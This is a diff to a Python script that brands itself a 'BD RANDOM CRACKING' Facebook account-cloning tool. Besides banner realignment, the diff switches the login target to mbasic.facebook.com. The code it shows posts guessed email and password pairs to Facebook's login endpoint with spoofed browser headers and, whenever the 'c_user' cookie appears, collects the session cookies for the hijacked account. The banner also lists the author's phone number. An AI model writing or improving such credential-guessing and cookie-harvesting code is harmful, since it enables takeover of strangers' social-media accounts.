@@ -129,17 +129,17 @@ logo=("""
  /_/    \_\_____/|_|  \_\/_/    \_\_|      /_/ \_\_____/ 
                                                                                                                                                                            
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
-║  \x1b[97m\033[37;41m Welcome to my RANDOM KING Tools                          \033[0;m  ║
+║  \x1b[97m\033[37;41m Welcome to my RANDOM KING Tools                   \033[0;m  ║
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
-║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V1 \033[0;m    ║
+║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V1 \033[0;m                ║
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-\33[1;92m║➣\033[1;91m DEVOLPER   :          ASRAF AHMED \33[1;92m║               
-\33[1;92m║➣ FACEBOOK   :          ASRAF AHMED \33[1;92m║                 
-\33[1;92m║➣\033[1;93m WHATSAPP   :          +8801858029266        \33[1;92m ║
-\33[1;92m║➣\033[1;34m GITHUB     :          Asrafxd17        \33[1;92m ║          
-\33[1;92m║➣\033[1;35m TOOLS      :          BD RANDOM CRACKING \33[1;92m ║                 
+\33[1;92m║➣\033[1;91m DEVOLPER   :          ASRAF AAHMED    \33[1;92m             ║               
+\33[1;92m║➣ FACEBOOK   :          ASRAF AHMED \33[1;92m                           ║                 
+\33[1;92m║➣\033[1;93m WHATSAPP   :          +8801858029266        \33[1;92m       ║
+\33[1;92m║➣\033[1;34m GITHUB     :          Asrafxd17        \33[1;92m            ║          
+\33[1;92m║➣\033[1;35m TOOLS      :          BD RANDOM CRACKING \33[1;92m          ║                 
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 """)
 def cek_apk(session,coki):
@@ -266,7 +266,7 @@ def b(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
             'method': 'GET',
             'path': '/login/device-based/login/async/',
             'scheme': 'https',
@@ -283,7 +283,7 @@ def b(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro,}
-            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
